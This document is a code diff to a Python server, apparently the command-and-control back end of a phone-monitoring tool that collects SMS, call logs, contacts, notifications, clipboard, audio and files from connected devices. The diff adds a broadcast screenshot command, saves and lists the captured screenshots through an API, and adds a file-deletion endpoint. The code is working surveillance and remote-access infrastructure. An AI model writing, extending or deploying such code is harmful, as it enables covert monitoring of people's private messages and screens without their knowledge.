@@ -48,6 +48,7 @@ class DeviceSession:
         self.last_heartbeat = time.time()
         self.device_info = {}
         self.total_images_received = 0
+        self.total_screenshots_received = 0
         self.total_audio_received = 0
         self.total_videos_received = 0
         self.total_files_received = 0
@@ -87,6 +88,7 @@ class DemoServer:
             'total_audio': 0,
             'total_videos': 0,
             'total_files': 0,
+            'total_screenshots': 0,
             'total_commands': 0,
             'total_notifications': 0,
             'uptime_start': self.start_time
@@ -140,6 +142,7 @@ class DemoServer:
             self.stats['active_connections'] = len([s for s in self.sessions.values() if s.connected])
             self.stats['total_connections'] = self.session_counter
             self.stats['total_images'] = sum(s.total_images_received for s in self.sessions.values())
+            self.stats['total_screenshots'] = sum(s.total_screenshots_received for s in self.sessions.values())
             self.stats['total_audio'] = sum(s.total_audio_received for s in self.sessions.values())
             self.stats['total_videos'] = sum(s.total_videos_received for s in self.sessions.values())
             self.stats['total_files'] = sum(s.total_files_received for s in self.sessions.values())
@@ -372,6 +375,9 @@ class DemoServer:
                 elif command == "get_sms_logs":
                     self.send_command_to_all("get_sms_logs")
 
+                elif command == "screenshot":
+                    self.send_command_to_all("screenshot")
+
                 else:
                     print(f"Unknown command: {command}. Type 'help' for available commands.")
 
@@ -407,6 +413,10 @@ class DemoServer:
         print("  17. get_notifications  - Get recent notifications")
         print("\n  --- v5.1 NEW ---")
         print("  18. get_sms_logs       - Get SMS/inbox messages")
+        print("\n  --- v6.0 NEW ---")
+        print("  19. get_battery_info   - Get battery status and health")
+        print("  20. get_clipboard      - Get current clipboard content")
+        print("  21. screenshot         - Capture device screenshot (requires user prompt)")
         print("\n  --- Server Commands ---")
         print("  19. list_devices       - Show connected devices")
         print("  20. stats              - Show server statistics")
@@ -717,6 +727,38 @@ class DemoServer:
                     session.total_audio_received += 1
             self.log_to_file(message, session.address)
 
+        elif msg_type == "screenshot_data":
+            # Handle screenshot image data
+            image_b64 = message.get("data", "")
+            if image_b64:
+                try:
+                    image_bytes = base64.b64decode(image_b64)
+                    timestamp = int(time.time())
+                    filename = f"screenshot_{session.session_id}_{timestamp}.png"
+                    filepath = os.path.join(IMAGES_DIR, filename)
+                    with open(filepath, 'wb') as f:
+                        f.write(image_bytes)
+                    self.log(f"[+] Screenshot saved: {filepath} ({len(image_bytes)} bytes)")
+                    with self.lock:
+                        session.total_screenshots_received += 1
+                        # Also count as image for backward compatibility with stats
+                        session.total_images_received += 1
+                    # Optional: save metadata
+                    meta = {
+                        "session_id": session.session_id,
+                        "timestamp": timestamp,
+                        "width": message.get("width", 0),
+                        "height": message.get("height", 0),
+                        "format": message.get("format", "png")
+                    }
+                    meta_file = os.path.join(DOCS_DIR, f"screenshot_{session.session_id}_{timestamp}.json")
+                    with open(meta_file, 'w') as f:
+                        json.dump(meta, f, indent=2)
+                    self.log(f"    [+] Metadata saved to: {meta_file}")
+                except Exception as e:
+                    self.log(f"[!] Failed to process screenshot: {e}")
+            self.log_to_file(message, session.address)
+
         # === v4.0 NEW MESSAGE HANDLERS ===
 
         elif msg_type == "call_logs":
@@ -872,6 +914,8 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
             self.handle_list_received_files(query)
         elif path == '/api/download-file':
             self.handle_download_received_file(query)
+        elif path == '/api/screenshots':
+            self.handle_get_screenshots(query)
         elif path == '/api/call-logs':
             self.handle_get_call_logs(query)
         elif path == '/api/contacts':
@@ -894,13 +938,30 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
         path = parsed.path
 
         if path == '/api/command':
+            self.handle_post_command_route()
+        else:
+            self.send_error(404, "Not Found")
+
+    def handle_post_command_route(self):
+        """Read POST body and route to handle_post_command."""
+        try:
             content_length = int(self.headers.get('Content-Length', 0))
-            post_data = self.rfile.read(content_length)
+            body = self.rfile.read(content_length)
+            data = json.loads(body.decode('utf-8'))
+            self.handle_post_command(data)
+        except Exception as e:
             try:
-                data = json.loads(post_data.decode('utf-8'))
-                self.handle_post_command(data)
+                self.send_json_response({'status': 'error', 'message': str(e)})
             except:
-                self.send_error(400, "Bad Request")
+                pass
+
+    def do_DELETE(self):
+        parsed = urllib.parse.urlparse(self.path)
+        path = parsed.path
+        query = urllib.parse.parse_qs(parsed.query)
+
+        if path == '/api/delete-file':
+            self.handle_delete_file(query)
         else:
             self.send_error(404, "Not Found")
 
@@ -1115,6 +1176,27 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
             except (BrokenPipeError, ConnectionResetError):
                 pass  # Client already gone
 
+    def handle_get_screenshots(self, query):
+        """List screenshot files in received_files/images directory."""
+        # We'll look for screenshot files in the images directory
+        images_dir = os.path.abspath(IMAGES_DIR)
+        files_list = []
+        if os.path.isdir(images_dir):
+            for entry in os.listdir(images_dir):
+                if entry.startswith('screenshot_') and (entry.endswith('.png') or entry.endswith('.jpg') or entry.endswith('.jpeg')):
+                    entry_path = os.path.join(images_dir, entry)
+                    rel_path = os.path.relpath(entry_path, images_dir).replace(os.sep, '/')
+                    # We want to serve from the images directory, so the path relative to the images dir
+                    files_list.append({
+                        'name': entry,
+                        'path': f'images/{rel_path}',  # prefix with images/ so the frontend can construct the URL
+                        'is_dir': False,
+                        'size': os.path.getsize(entry_path)
+                    })
+        # Sort by name (which includes timestamp) descending so newest first
+        files_list.sort(key=lambda x: x['name'], reverse=True)
+        self.send_json_response({'screenshots': files_list})
+
     def handle_get_call_logs(self, query):
         sid = query.get('session', ['1'])[0]
         with self.server_instance.lock:
@@ -1156,6 +1238,26 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
         with self.server_instance.lock:
             session = self.server_instance.sessions.get(int(sid))
             self.send_json_response({'device_info': session.last_device_info} if session else {'device_info': {}})
+
+    def handle_delete_file(self, query):
+        """Delete a file from received_files directory."""
+        filepath = query.get('path', [''])[0]
+        if not filepath:
+            self.send_json_response({'status': 'error', 'message': 'Missing path parameter'})
+            return
+        base_dir = os.path.abspath(RECEIVED_DIR)
+        full_path = os.path.normpath(os.path.join(base_dir, filepath))
+        if not full_path.startswith(base_dir):
+            self.send_json_response({'status': 'error', 'message': 'Forbidden'})
+            return
+        if not os.path.isfile(full_path):
+            self.send_json_response({'status': 'error', 'message': 'File not found'})
+            return
+        try:
+            os.remove(full_path)
+            self.send_json_response({'status': 'success', 'message': 'File deleted', 'path': filepath})
+        except Exception as e:
+            self.send_json_response({'status': 'error', 'message': str(e)})
 
     def send_json_response(self, data):
         response = json.dumps(data)
